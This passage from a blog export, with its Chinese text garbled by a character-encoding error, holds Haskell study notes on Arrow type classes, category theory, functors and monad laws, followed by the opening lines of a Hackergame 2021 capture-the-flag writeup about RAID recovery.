-&gt; let y = 2 * x z1 = y + 3 z2 = y - 5 in (z1, z2) -- ghci&gt; f 10 -- (23,15)fM :: Int -&gt; Identity (Int, Int)fM = \\x -&gt; do y &lt;- return (2 * x) z1 &lt;- return (y + 3) z2 &lt;- return (y - 5) return (z1, z2)-- ghci&gt; runIdentity (fM 10)-- (23,15)fA :: Int -&gt; (Int, Int)fA = proc x -&gt; do y &lt;- (2 *) -&lt; x z1 &lt;- (+ 3) -&lt; y z2 &lt;- (subtract 5) -&lt; y returnA -&lt; (z1, z2)-- ghci&gt; fA 10-- (23,15) ArrowChoice12345678910111213141516171819202122232425262728293031class Arrow a =&gt; ArrowChoice a where left :: a b c -&gt; a (Either b d) (Either c d) left = (+++ id) right :: a b c -&gt; a (Either d b) (Either d c) right = (id +++) (+++) :: a b c -&gt; a b' c' -&gt; a (Either b b') (Either c c') f +++ g = left f &gt;&gt;&gt; arr mirror &gt;&gt;&gt; left g &gt;&gt;&gt; arr mirror where mirror :: Either x y -&gt; Either y x mirror (Left x) = Right x mirror (Right y) = Left y (|||) :: a b d -&gt; a c d -&gt; a (Either b c) d f ||| g = f +++ g &gt;&gt;&gt; arr untag where untag (Left x) = x untag (Right y) = yinstance ArrowChoice (-&gt;) where left f = f +++ id right f = id +++ f f +++ g = (Left . f) ||| (Right . g) (|||) = eitherinstance Monad m =&gt; ArrowChoice (Kleisli m) where left f = f +++ arr id right f = arr id +++ f f +++ g = (f &gt;&gt;&gt; arr Left) ||| (g &gt;&gt;&gt; arr Right) Kleisli f ||| Kleisli g = Kleisli (either f g) ArrowZero &amp; ArrowPlus1234567891011class Arrow a =&gt; ArrowZero a where zeroArrow :: a b cclass ArrowZero a =&gt; ArrowPlus a where (&lt;+&gt;) :: a b c -&gt; a b c -&gt; a b cinstance MonadPlus m =&gt; ArrowZero (Kleisli m) where zeroArrow = Kleisli (\\_ -&gt; mzero)instance MonadPlus m =&gt; ArrowPlus (Kleisli m) where Kleisli f &lt;+&gt; Kleisli g = Kleisli (\\x -&gt; f x `mplus` g x) ä¾‹å­123456789101112131415161718192021222324252627282930ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) &lt;+&gt; (Kleisli (\\x -&gt; [x, -x]))) 2[4,2,-2]ghci&gt; either (+2) (*3) (Left 3)5ghci&gt; either (+2) (*3) (Right 3)9ghci&gt; (+2) ||| (*3) $ (Left 3)5ghci&gt; (+2) +++ (*3) $ (Left 3)Left 5ghci&gt; (+2) ||| (*3) $ (Right 3)9ghci&gt; (+2) +++ (*3) $ (Right 3)Right 9ghci&gt; left (+2) (Left 3)Left 5ghci&gt; right (*3) (Right 3)Right 9ghci&gt; left (+2) (Right 3)Right 3ghci&gt; right (*3) (Left 3)Left 3ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) ||| (Kleisli (\\x -&gt; [x, -x]))) (Left 3)[6]ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) ||| (Kleisli (\\x -&gt; [x, -x]))) (Right 3)[3,-3]ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) +++ (Kleisli (\\x -&gt; [x, -x]))) (Left 3)[Left 6]ghci&gt; runKleisli ((Kleisli (\\x -&gt; [x * 2])) +++ (Kleisli (\\x -&gt; [x, -x]))) (Right 3)[Right 3,Right (-3)] Haskellä¸èŒƒç•´è®ºHaskellä¸­çš„å‡½å­å•å­ç­‰éƒ½ä¸èŒƒç•´è®ºï¼ˆcategory theoryï¼‰æœ‰å¾ˆå¤šè”ç³»ï¼Œæ‰€ä»¥æ‰“ç®—ç®€å•äº†è§£ä¸€ä¸‹èŒƒç•´è®ºçš„ç›¸å…³å†…å®¹ã€‚ èŒƒç•´è®ºæ˜¯æ•°å­¦çš„ä¸€é—¨å­¦ç§‘ï¼Œä»¥æŠ½è±¡çš„æ–¹æ³•å¤„ç†æ•°å­¦æ¦‚å¿µï¼Œå°†è¿™äº›æ¦‚å¿µå½¢å¼åŒ–æˆä¸€ç»„ç»„çš„â€œç‰©ä»¶â€åŠâ€œæ€å°„â€ã€‚æ•°å­¦ä¸­è®¸å¤šé‡è¦çš„é¢†åŸŸå¯ä»¥å½¢å¼åŒ–ä¸ºèŒƒç•´ã€‚ä½¿ç”¨èŒƒç•´è®ºå¯ä»¥ä»¤è¿™äº›é¢†åŸŸä¸­è®¸å¤šéš¾ç†è§£ã€éš¾æ‰æ‘¸çš„æ•°å­¦ç»“è®ºæ›´å®¹æ˜“å™è¿°è¯æ˜ã€‚ â€”â€”â€”â€” ç»´åŸºç™¾ç§‘ èŒƒç•´ï¼ˆCategoryï¼‰èŒƒç•´æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç®€å•çš„é›†åˆï¼Œä¸€ä¸ªèŒƒç•´$\\mathbf{C}$åŒ…å«ä¸‰ä¸ªç»„æˆæˆåˆ†ï¼š ä¸€ä¸ªç±»$\\mathrm{ob}(\\mathbf{C})$ï¼šå…¶ä¸­å…ƒç´ ç§°ä¸ºå¯¹è±¡ï¼ˆobjectsï¼‰ ä¸€ä¸ªç±»$\\mathrm{hom}(\\mathbf{C})$ï¼šå…¶ä¸­å…ƒç´ ç§°ä¸ºæ€å°„ï¼ˆmorphismsï¼‰ï¼ˆæˆ–ç®­å·ï¼ˆarrowsï¼‰ï¼‰ï¼šæ¯ä¸ªæ€å°„è¿æ¥äº†ä¸¤ä¸ªå¯¹è±¡ï¼šæºå¯¹è±¡ï¼ˆsource objectï¼‰ã€ç›®æ ‡å¯¹è±¡ï¼ˆtarget objectï¼‰ã€‚å¦‚æœ$f$æ˜¯ä»æºå¯¹è±¡$A$åˆ°ç›®æ ‡å¯¹è±¡$B$ï¼ˆ$A, B\\in \\mathrm{ob}(\\mathbf{C})$ï¼‰çš„æ€å°„ï¼Œé‚£ä¹ˆè®°ä¸º$f : A\\to B$ ä¸€ä¸ªäºŒå…ƒè¿ç®—ï¼Œç§°ä¸ºæ€å°„å¤åˆï¼ˆcompositionï¼‰ï¼šä¸¤ä¸ªæ€å°„$g : A\\to B$ã€$f : B\\to C$çš„å¤åˆè®°ä¸º$f\\circ g : A\\to C$åœ¨Haskellå’Œå¤§éƒ¨åˆ†æ•°å­¦ç†è®ºä¸­éƒ½æ˜¯ä»å³å‘å·¦è®¡ç®—ï¼Œå³$f\\circ g$ä¸­æ˜¯å…ˆè®¡ç®—$g : A\\to B$å†è®¡ç®—$f : B\\to C$ è®¸å¤šä¸œè¥¿éƒ½å¯ä»¥ç»„æˆèŒƒç•´ã€‚æ¯”å¦‚: &emsp;$\\mathbf{Set}$æ˜¯ä¸€ä¸ªèŒƒç•´ï¼Œå¯¹è±¡ä¸ºæ‰€æœ‰é›†åˆï¼Œæ€å°„ä¸ºé›†åˆä¹‹é—´çš„å‡½æ•°ï¼Œå¤åˆå³å‡½æ•°ä¹‹é—´çš„å¤åˆ &emsp;$\\mathbf{Grp}$æ˜¯ä¸€ä¸ªèŒƒç•´ï¼Œå¯¹è±¡ä¸ºæ‰€æœ‰ç¾¤ï¼Œæ€å°„ä¸ºç¾¤åŒæ€ï¼ˆgroup homomorphismsï¼‰ï¼Œä¾‹å¦‚å¯¹äºç¾¤$(G,*)$å’Œ$(H,\\cdot )$ï¼Œæœ‰ç¾¤åŒæ€$h : (G,*)\\to (H,\\cdot )$ï¼Œåˆ™éœ€è¦å¯¹äº$G$ä¸­çš„ä»»æ„å…ƒç´ $u,v$æ»¡è¶³$$h(u*v)=h(u)\\cdot h(v)$$ æ³¨æ„ï¼šæ€å°„ä¸å¿…é¡»ä¸ºå‡½æ•°ï¼›è€Œä¸”å¯ä»¥å­˜åœ¨æºå¯¹è±¡å’Œç›®æ ‡å¯¹è±¡éƒ½ç›¸åŒçš„ä¸åŒæ€å°„ èŒƒç•´å…¬ç†æ¯ä¸ªèŒƒç•´éƒ½éœ€è¦æ»¡è¶³ä¸‰æ¡å®šå¾‹ï¼š æ€å°„å¤åˆéœ€è¦æ»¡è¶³ç»“åˆå¾‹ï¼ˆassociativityï¼‰ï¼š$$f\\circ (g\\circ h) = (f\\circ g)\\circ h$$ èŒƒç•´åœ¨å¤åˆæ“ä½œä¸‹æ˜¯é—­åˆçš„ï¼ˆclosedï¼‰ï¼š&emsp;&emsp;&emsp;å¦‚æœèŒƒç•´$\\mathbf{C}$ä¸­å­˜åœ¨æ€å°„$f : B\\to C$ã€$g : A\\to B$ï¼Œé‚£ä¹ˆèŒƒç•´$\\mathbf{C}$ä¸­ä¹Ÿä¸€å®šå­˜åœ¨æ€å°„$h : A\\to C$ï¼Œä¸”$h=f\\circ g$ æ¯ä¸ªå¯¹è±¡éƒ½éœ€è¦æœ‰å•ä½æ€å°„ï¼ˆidentity morphismsï¼‰ï¼š&emsp;&emsp;&emsp;å¯¹äºèŒƒç•´$\\mathbf{C}$ä¸­çš„å¯¹è±¡$A$ï¼Œä¸€å®šå­˜åœ¨å•ä½æ€å°„$\\mathrm{id}_A : A\\to A$ï¼Œä¸”å¯¹äºæ¯ä¸ªæ€å°„$g : A\\to B$ï¼Œä¸€å®šæœ‰ï¼š$$g\\circ\\mathrm{id}_A = \\mathrm{id}_B\\circ g = g$$ $\\mathbf{Hask}$èŒƒç•´èŒƒç•´$\\mathbf{Hask}$çš„å¯¹è±¡ä¸ºHaskellä¸­çš„ç±»å‹ï¼ˆtypesï¼‰ï¼Œæ€å°„æ˜¯Haskellä¸­çš„å‡½æ•°ï¼Œå¤åˆè¿ç®—æ˜¯(.)ã€‚å³ä»ç±»å‹Aåˆ°ç±»å‹Bçš„å‡½æ•° f :: A -&gt; B å°±æ˜¯$\\mathbf{Hask}$èŒƒç•´ä¸­çš„ä¸€ä¸ªæ€å°„ã€‚è€Œå‡½æ•° f :: B -&gt; C ã€g :: A -&gt; B çš„ç»„åˆ f . g å°±æ˜¯ä¸€ä¸ªæ–°çš„å‡½æ•° h :: A -&gt; Cã€‚ å¯¹äºä¸‰æ¡å®šå¾‹ï¼š ç¬¬ä¸€æ¡æ˜¾ç„¶æ»¡è¶³ï¼šf . (g . h) = (f . g) . h ç¬¬äºŒæ¡ä¹Ÿæ˜¾ç„¶æ»¡è¶³ï¼Œå¦‚æœæœ‰å‡½æ•° f :: B -&gt; C ã€g :: A -&gt; Bï¼Œä¸€å®šæœ‰å‡½æ•° h = (f . g) :: A -&gt; C å¯¹äºç¬¬ä¸‰æ¡å®šå¾‹ï¼ŒHaskellä¸­å­˜åœ¨å•ä½å‡½æ•° id ï¼Œä½†idæ˜¯å¤šæ€ï¼ˆpolymorphicï¼‰çš„ï¼Œè¦ä¸ºå…¶æŒ‡å®šç±»å‹ä½¿å…¶å˜æˆå•æ€ï¼ˆmonomorphicï¼‰çš„ã€‚æ¯”å¦‚æ€å°„$\\mathrm{id}_A$åœ¨Haskellä¸­å°±å¯ä»¥è¡¨ç¤ºä¸º id :: A -&gt; Aã€‚å¹¶ä¸”æ˜¾ç„¶æ»¡è¶³ç¬¬ä¸‰æ¡å®šå¾‹ï¼ˆå…¶ä¸­ f :: A -&gt; Bï¼‰ï¼š(id :: B -> B) . f = f . (id :: A -> A) = f å‡½å­ï¼ˆFunctorsï¼‰ä¸€ä¸ªèŒƒç•´ä¸­çš„æ€å°„å°†ä¸¤ä¸ªå¯¹è±¡è”ç³»èµ·æ¥ï¼Œè€Œå‡½å­åˆ™ä¼šå°†ä¸¤ä¸ªèŒƒç•´è”ç³»èµ·æ¥ã€‚æ¢å¥è¯è¯´ï¼Œå‡½å­å°±æ˜¯ä»ä¸€ä¸ªèŒƒç•´åˆ°å¦ä¸€ä¸ªèŒƒç•´çš„å˜æ¢ã€‚æ¯”å¦‚å¯¹äºèŒƒç•´$\\mathbf{C}$ã€$\\mathbf{D}$ï¼Œå®šä¹‰å‡½å­$F : \\mathbf{C}\\to\\mathbf{D}$æ»¡è¶³ï¼š å¯¹äº$\\mathbf{C}$ä¸­çš„ä»»æ„å¯¹è±¡$A$ï¼Œåœ¨$\\mathbf{D}$ä¸­éƒ½æœ‰å¯¹è±¡$F(A)$ å¯¹äº$\\mathbf{C}$ä¸­çš„ä»»æ„æ€å°„$f : A\\to B$ï¼Œåœ¨$\\mathbf{D}$ä¸­éƒ½æœ‰æ€å°„$F(f) : F(A)\\to F(B)$ æ¯”å¦‚ï¼š &emsp;é—å¿˜å‡½å­ï¼ˆforgetful functorï¼‰$U : \\mathbf{Grp}\\to\\mathbf{Set}$ï¼Œå°†ä¸€ä¸ªç¾¤æ˜ å°„åˆ°ä¸€ä¸ªé›†åˆä¸­ï¼Œå°†ç¾¤åŒæ€æ˜ å°„åˆ°é›†åˆé—´çš„å‡½æ•° &emsp;å¹‚é›†å‡½å­ï¼ˆpower set functorï¼‰$P : \\mathbf{Set}\\to\\mathbf{Set}$ï¼Œå°†ä¸€ä¸ªé›†åˆæ˜ å°„åˆ°å®ƒçš„å¹‚é›†ï¼Œå°†åŸé›†åˆä¸­çš„å‡½æ•°$f : A\\to B$æ˜ å°„åˆ°å‡½æ•°$P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)$ï¼Œå³ä»$U\\subseteq A$åˆ°å€¼åŸŸ$f(U)\\subseteq B$çš„æ˜ å°„ &emsp;è‡ªå‡½å­ï¼ˆendofunctorï¼‰$1_{\\mathbf{C}} : \\mathbf{C}\\to\\mathbf{C}$ï¼Œå°†ä¸€ä¸ªèŒƒç•´æ˜ å°„åˆ°å®ƒæœ¬èº« å‡½å­å…¬ç†å‡½å­$F : \\mathbf{C}\\to\\mathbf{D}$ä¹Ÿéœ€è¦æ»¡è¶³ä¸¤ä¸ªå…¬ç†ï¼š å¯¹äºä»»æ„å¯¹è±¡$X\\in\\mathbf{C}$ï¼Œæ’æœ‰$F(\\mathrm{id}_X)=\\mathrm{id}_{F(X)}$ å¯¹äºæ€å°„$f : Y\\to Z$ã€$g : X\\to Y$ï¼Œæ’æœ‰$F(f\\circ g) = F(f)\\circ F(g)$ $\\mathbf{Hask}$èŒƒç•´ä¸Šçš„å‡½å­Haskellä¸­çš„Functorå®šä¹‰æ˜¯ï¼š 12class Functor (f :: * -&gt; *) where fmap :: (a -&gt; b) -&gt; f a -&gt; f b å¯¹äºHaskellä¸­çš„Functorï¼Œå®ƒå®é™…ä¸Šæ˜¯ä»$\\mathbf{Hask}$èŒƒç•´ï¼ˆtypesï¼‰åˆ°å®ƒå­èŒƒç•´çš„å˜æ¢ã€‚æ¯”å¦‚åˆ—è¡¨å‡½å­$\\mathtt{[]} : \\mathbf{Hask}\\to\\mathbf{Lst}$ï¼ˆå…¶ä¸­$\\mathbf{Lst}$æ˜¯æ‰€æœ‰Haskellä¸­åˆ—è¡¨ç±»å‹æ„æˆçš„èŒƒç•´ï¼‰ å®ƒä¹Ÿè¾¾æˆäº†èŒƒç•´è®ºä¸­å¯¹äºå‡½å­çš„è¦æ±‚ã€‚å‡½å­éœ€è¦è¿›è¡Œä¸¤ä¸ªæ“ä½œï¼šå°†ä¸€ä¸ªèŒƒç•´ä¸­çš„å¯¹è±¡æ˜ å°„åˆ°å¦ä¸€ä¸ªèŒƒç•´ä¸­ã€å°†ä¸€ä¸ªèŒƒç•´ä¸­çš„æ€å°„æ˜ å°„åˆ°å¦ä¸€ä¸ªèŒƒç•´ä¸­ã€‚ä»¥Maybeä¸ºä¾‹ï¼Œå®ƒå®ç°äº†å‡½å­çš„è¦æ±‚ï¼š Maybeæ˜¯ä¸€ä¸ªç±»å‹æ„é€ å™¨ï¼Œä»–å¯ä»¥å°†ä»»æ„ç±»å‹ T å˜æˆæ–°ç±»å‹ Maybe Tï¼Œç›¸å½“äºä»$\\mathbf{Hask}$èŒƒç•´çš„å¯¹è±¡å˜æˆäº†$\\mathbf{Maybe}$èŒƒç•´çš„å¯¹è±¡ fmapå‡½æ•°æ¥æ”¶ä¸€ä¸ª a -&gt; b ç±»å‹çš„å‡½æ•°ï¼Œè¿”å›ä¸€ä¸ª Maybe a -&gt; Maybe b ç±»å‹çš„å‡½æ•°ï¼Œç›¸å½“äºå°†$\\mathbf{Hask}$èŒƒç•´ä¸­çš„æ€å°„$f : A\\to B$æ˜ å°„æˆäº†$\\mathbf{Maybe}$èŒƒç•´ä¸­çš„æ€å°„$\\mathbf{Maybe}(f) : \\mathbf{Maybe}(A)\\to\\mathbf{Maybe}(B)$ æ³¨æ„ï¼šæ—¶åˆ»è®°ä½è¿™é‡Œç ”ç©¶çš„æ˜¯$\\mathbf{Hask}$èŒƒç•´å’Œå®ƒçš„å­èŒƒç•´ï¼Œå¯¹è±¡æ˜¯ç±»å‹è€Œä¸æ˜¯å€¼ï¼Œæ€å°„æ˜¯å‡½æ•°ä¹ŸæŒ‡çš„æ˜¯ä»ç±»å‹åˆ°ç±»å‹ åŒæ—¶ï¼ŒHaskellä¸­çš„Functorä¹Ÿæ»¡è¶³å‡½å­å…¬ç†ï¼š fmap id = id å³ fmap (id :: A -&gt; A) = (id :: f A -&gt; f A) fmap (f . g) = fmap f . fmap g å•å­ï¼ˆMonadsï¼‰ ä¸€ä¸ªå•å­è¯´ç™½äº†ä¸è¿‡å°±æ˜¯è‡ªå‡½å­èŒƒç•´ä¸Šçš„ä¸€ä¸ªå¹ºåŠç¾¤è€Œå·² _(:Ğ·ã€âˆ )_ è‡ªå‡½å­åœ¨å‰é¢è¯´åˆ°è¿‡æ˜¯ä»ä¸€ä¸ªèŒƒç•´åˆ°è‡ªèº«çš„ä¸€ä¸ªå‡½å­ï¼Œå¦‚èŒƒç•´$\\mathbf{C}$ä¸Šçš„è‡ªå‡½å­æ˜¯$F : \\mathbf{C}\\to\\mathbf{C}$ã€‚è‡ªå‡½å­èŒƒç•´å°±æ˜¯å¯¹è±¡éƒ½æ˜¯è‡ªå‡½å­çš„èŒƒç•´ã€‚å¹ºåŠç¾¤å’ŒHaskellä¸­å­¦åˆ°çš„Monoidç±»å‹ç±»ä¸€æ ·ï¼Œæ˜¯ä¸€ä¸ªæœ‰å¯ç»“åˆäºŒå…ƒè¿ç®—å’Œå•ä½å…ƒçš„ä»£æ•°ç»“æ„ã€‚å› æ­¤å•å­å°±æ˜¯ä¸€ä¸ªè‡ªå‡½å­ï¼Œè€Œä¸”å®ƒæœ‰å¯ç»“åˆäºŒå…ƒè¿ç®—ï¼ˆHaskellä¸­&gt;=&gt;ï¼‰å’Œå•ä½å…ƒï¼ˆHaskellä¸­returnï¼‰ã€‚ ä¸€ä¸ªå•å­$M : \\mathbf{C}\\to\\mathbf{C}$è¿˜åŒ…å«ä¸¤ä¸ªæ€å°„ï¼ˆå¯¹äºèŒƒç•´$\\mathbf{C}$ä¸­çš„æ‰€æœ‰å¯¹è±¡$X$ï¼‰ï¼š $\\mathrm{unit}_X^M : X\\to M(X)$ $\\mathrm{join}_X^M : M(M(X))\\to M(X)$ ï¼ˆå½“å¼å­ä¸­çš„å•å­æ˜æ˜¾æ˜¯$M$æ—¶ï¼Œå¯ä»¥çœç•¥ä¸Šæ ‡${}^M$ï¼‰ Haskellä¸­Monadçš„å®šä¹‰æ˜¯ï¼š 123class Functor m =&gt; Monad m where return :: a -&gt; m a (&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b å…¶ä¸­å¾ˆæ˜¾ç„¶å¤šæ€å‡½æ•°returnå¯¹åº”äº†å®šä¹‰ä¸­çš„$\\mathrm{unit}$ï¼Œä½†æ˜¯&gt;&gt;=å’Œ$mathrm{join}$çš„å¯¹åº”å…³ç³»å¹¶ä¸æ˜æ˜¾ã€‚å› æ­¤Haskellä¸­æœ‰ä¸€ä¸ªå·¥å…·å‡½æ•°joinï¼Œå®ƒçš„æ•ˆæœå°±æ˜¯å®šä¹‰ä¸­çš„$\\mathrm{join}$ï¼Œè€Œä¸”å®ƒå¯ä»¥å’Œ&gt;&gt;=äº’ç›¸å®šä¹‰ï¼š 12345join :: Monad m =&gt; m (m a) -&gt; m ajoin x = x &gt;&gt;= id(&gt;&gt;=) :: m a -&gt; (a -&gt; m b) -&gt; m b x &gt;&gt;= f = join $ fmap f x æ‰€ä»¥Haskellä¸­ä¸ºMonadè¦æ±‚å®šä¹‰&gt;&gt;=å°±ç›¸å½“äºå®šä¹‰äº†$\\mathrm{join}$ ä¾‹å¦‚ï¼Œå¹‚é›†å‡½å­$P : \\mathbf{Set}\\to\\mathbf{Set}$ä¹Ÿæ˜¯ä¸€ä¸ªå•å­ï¼Œå¯ä»¥ä¸ºå®ƒå®šä¹‰$\\mathrm{unit}$å’Œ$\\mathrm{join}$ä¸¤ä¸ªæ€å°„ã€‚Haskellä¸­çš„åˆ—è¡¨ä¹Ÿå¯ä»¥è¿‘ä¼¼çœ‹ä½œå¹‚é›†å‡½å­ã€‚ &emsp;æ€å°„/å‡½æ•°çš„ç±»å‹ï¼š å¹‚é›†å‡½å­ Haskellä¸­åˆ—è¡¨ ä¸€ä¸ªé›†åˆ$S$å’Œä¸€ä¸ªæ€å°„$f : A\\to B$ ä¸€ä¸ªç±»å‹ T å’Œä¸€ä¸ªå‡½æ•° f :: A -&gt; B $P(f) : \\mathcal{P}(A)\\to\\mathcal{P}(B)$ fmap f :: [A] -&gt; [B] $\\mathrm{unit}_S : S\\to\\mathcal{P}(S)$ return :: T -&gt; [T] $\\mathrm{join}_S : \\mathcal{P}(\\mathcal{P}(S))\\to\\mathcal{P}(S)$ join :: [[T]] -&gt; [T] &emsp;æ€å°„/å‡½æ•°çš„å®šä¹‰ï¼š å¹‚é›†å‡½å­ Haskellä¸­åˆ—è¡¨ $(\\mathcal{P}(f))(S) = \\{f(a):a\\in S\\}$ fmap f xs = [ f a | a &lt;- xs ] $\\mathrm{unit}_S(x) = \\{x\\}$ return x = [x] $\\mathrm{join}_S(L) = \\bigcup L$ join xs = concat xs å•å­å…¬ç†ç»™å®šä¸€ä¸ªå•å­$M : \\mathbf{C}\\to\\mathbf{C}$ï¼Œå’Œä¸€ä¸ªæ€å°„$f : A\\to B$ï¼ˆå…¶ä¸­$A,B\\in \\mathbf{C}$ï¼‰ï¼Œé‚£ä¹ˆæ»¡è¶³ä¸‹é¢å››æ¡å®šå¾‹ï¼š $\\mathrm{join}\\circ M(\\mathrm{join})=\\mathrm{join}\\circ\\mathrm{join}$ $\\mathrm{join}\\circ M(\\mathrm{unit})=\\mathrm{join}\\circ\\mathrm{unit}=\\mathrm{id}$ $\\mathrm{unit}\\circ f = M(f)\\circ\\mathrm{unit}$ $\\mathrm{join}\\circ M(M(f)) = M(f)\\circ\\mathrm{join}$ ä¹Ÿå¯ä»¥å¾ˆè‡ªç„¶åœ°å°†å…¶è½¬åŒ–ä¸ºHaskellä¸­çš„è¡¨è¿°ï¼š join . fmap join = join . join join . fmap return = join . return = id return . f = fmap f . return join . fmap (fmap f) = fmap f . join åœ¨Haskellä¸­ï¼Œä½¿ç”¨&gt;&gt;=ä¹Ÿæœ‰ä¸‰ä¸ªå®šå¾‹å’Œè¿™å››ä¸ªå®šå¾‹æ˜¯ç­‰ä»·çš„ï¼š return x &gt;&gt;= f = f x 123456 return x &gt;&gt;= f = join (fmap f (return x)) = join (fmap f . return $ x)= join (return (f x)) = join (return . f $ x)= join . return $ (f x)= id (f x)= f x m &gt;&gt;= return = m1234 m &gt;&gt;= return = join (fmap return m) = join . fmap return $ m = id m= m (m &gt;&gt;= f) &gt;&gt;= g = m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g)123456789101112 (m &gt;&gt;= f) &gt;&gt;= g = (join (fmap f m)) &gt;&gt;= g = join (fmap g (join (fmap f m)))= join . fmap g . join $ fmap f m = join . join . fmap (fmap g) $ fmap f m = join . join . fmap (fmap g) . fmap f $ m = join . join . fmap (fmap g . f) $ m = join . fmap join . fmap (fmap g . f) $ m = join . fmap (join . (fmap g . f)) $ m = join . fmap (\\x -&gt; join (fmap g (f x))) $ m = join . fmap (\\x -&gt; f x &gt;&gt;= g) $ m = join (fmap (\\x -&gt; f x &gt;&gt;= g) m)= m &gt;&gt;= (\\x -&gt; f x &gt;&gt;= g) æœ‰å…³doè¯­å¥å’Œ&gt;=&gt;çš„å…¬ç†è¡¨è¿°åœ¨ä¸Šæ–‡ä¸­å·²ç»è¯´è¿‡ åè®°å•ƒäº†å°†è¿‘ä¸€ä¸ªæœˆï¼Œç®—æ˜¯æŠŠHaskellçš„ä¸»è¦å†…å®¹éƒ½å•ƒå®Œäº†ã€‚ä¸»è¦å°±æ˜¯å‰æœŸçœ‹Learn You a Haskellï¼ŒåæœŸçœ‹Typeclassopediaï¼Œéƒ½æ˜¯pdcxsæ¨èç»™çš„æ•™ç¨‹ã€‚ä½†æ˜¯ä¸€å †è§†é¢‘ä¸€ä¸ªéƒ½æ²¡æœ‰è€å¿ƒçœ‹è¿›å»qwq åé¢çš„éƒ¨åˆ†çš„ç†è§£æ„Ÿè§‰ä¹Ÿæ²¡åˆ°ä½ï¼ŒCategoryã€Arrowç­‰è¿™äº›ç±»å‹ç±»ä¹Ÿå°±æ˜¯å¤§è‡´åœ°çœ‹äº†ä¸€çœ¼ï¼Œç”šè‡³æœ‰ä»€ä¹ˆç”¨éƒ½ä¸å¤ªæ¸…æ¥š_(:Ğ·ã€âˆ )_ æ„Ÿè§‰Haskellè¿™é—¨è¯­è¨€ç¡®å®å¾ˆç¥å¥‡ï¼Œå¾ˆå¤šè¯­æ³•éƒ½å¾ˆæœ‰æ„æ€ï¼Œè€Œä¸”å¯ä»¥åšåˆ°éå¸¸è´´è¿‘æ•°å­¦ã€è´´è¿‘æ•°å­¦æ¦‚å¿µã€‚å­¦çš„æ—¶å€™ä¹Ÿæ˜¯è¶Šå­¦å‘è¶Šå¤šï¼Œå…ˆæ˜¯å‡½æ•°å¼ç¼–ç¨‹å¼•ç”³åˆ°äº†lambdaæ¼”ç®—ï¼Œç„¶åæ˜¯å‡½å­ç­‰ä¸€ç³»åˆ—æ¦‚å¿µå¼•ç”³åˆ°äº†èŒƒç•´è®ºï¼Œç›®å‰èŒƒç•´è®ºç®€å•åœ°çœ‹äº†ä¸€éƒ¨åˆ†ï¼Œlambdaæ¼”ç®—ä¹Ÿæ²¡æ·±å…¥ç ”ç©¶ï¼Œä»¥åæœ‰æ—¶é—´å†è¯´äº†ï¼ˆå’•å’•å’•ï¼‰ ç°åœ¨æ„Ÿè§‰æˆ‘å­¦åˆ°çš„Haskellç®€ç›´æ˜¯çš®æ¯›ï¼Œè¿˜æœ‰ä¸€å †æºç é‡Œçš„ä¸œè¥¿ä¸çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹ï¼ˆåŒ…æ‹¬ä½†ä¸é™äº#ï¼Œ~ï¼‰ï¼Œä¹Ÿè¿˜æœ‰ä¸€å †ç±»å‹ç±»å’Œç”¨æ³•æ²¡æœ‰å­¦åˆ°ï¼ˆåŒ…æ‹¬ä½†ä¸é™äºMonad Transformerã€Writerã€Readerã€Stateã€Comonadã€MonadFixã€Lensã€Parsecã€â€¦â€¦ï¼‰mdï¼Œè¿™ä¹ˆä¸€çœ‹å·®çš„è¿˜çœŸå¤šï¼Œä»¥åæœ‰æ—¶é—´å†æ…¢æ…¢å­¦äº†ï¼Œè¿™ä¸ªå‡æœŸè¿˜æœ‰å¥½å¤šå…¶å®ƒäº‹è¦å¹²å‘¢ï¼ŒHaskellè¿™è¾¹å…ˆæ‘¸äº†_(:Ğ·ã€âˆ )_ Reference Learn You a Haskell Writing foldl using foldr - StackOverflow Haskellï¼šç”¨foldrå®šä¹‰foldl Typeclassopedia - Haskell wiki Hoogle Functors, Applicatives, And Monads In Pictures Haskellå­¦ä¹  - functor Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ8ï¼‰Monoid - zwvista Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ16ï¼‰Alternative - zwvista Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ40ï¼‰Arrowï¼ˆ1ï¼‰ - zwvista 24 Days of GHC Extensions: Arrows - Tom Ellis Haskellè¯­è¨€å­¦ä¹ ç¬”è®°ï¼ˆ47ï¼‰Arrowï¼ˆ2ï¼‰ - zwvista Haskell/Category theory - wikibooks Category theory - wikipedia èŒƒç•´è®º - ç»´åŸºç™¾ç§‘ Monad (category theory) - wikipedia Functor - wikipedia \"The End?\"","link":"/p/b3ca5c18.html"},{"title":"ã€ŒHackergame 2021ã€#4 Writup æŒç»­ç ´é˜²ç¯‡ 1","text":"&lt; #3 è¿™é‡Œæ¥ä¸Šä¸€ç¯‡ï¼ŒWriteup çš„æœ‰ï¼šé˜µåˆ—æ¢å¤ã€é©¬èµ›å…‹ã€minecRaftã€å¯†ç ç”Ÿæˆå™¨ï¼ˆå…¶å® minecRaft åº”è¯¥ç®—â€œå¼€å±€ä¸Šåˆ†â€ç¯‡ï¼Œä½†æ˜¯ä¸å¥½å¡äº†ï¼Œå°±æ”¾è¿™é‡Œäº†ï¼‰å‰©ä¸‹çš„å°±æ˜¯åšä¸ä¸Šçš„äº†ï¼Œçœ‹å®˜æ–¹ Writeup äº†ï¼ˆ é˜µåˆ—æ¢å¤å¤§å¸ˆï¼ˆè¿™é¢˜æ•´æ•´åšäº†æˆ‘ä¸¤å¤©å¤šï¼Œæ¯å¤©æ™šä¸Šéƒ½å¯¹ç€ç£ç›˜é˜µåˆ—â€¦â€¦ï¼‰ ä»¥ä¸‹æ˜¯ä¸¤ä¸ªå‹ç¼©åŒ…ï¼Œåˆ†åˆ«æ˜¯ä¸€ä¸ª RAID 0 é˜µåˆ—çš„ç£ç›˜å‹ç¼©åŒ…ï¼Œå’Œä¸€ä¸ª RAID 5 é˜µåˆ—çš„ç£ç›˜å‹ç¼©åŒ…ï¼Œå¯¹åº”æœ¬é¢˜çš„ä¸¤å°é—®ã€‚ä½ 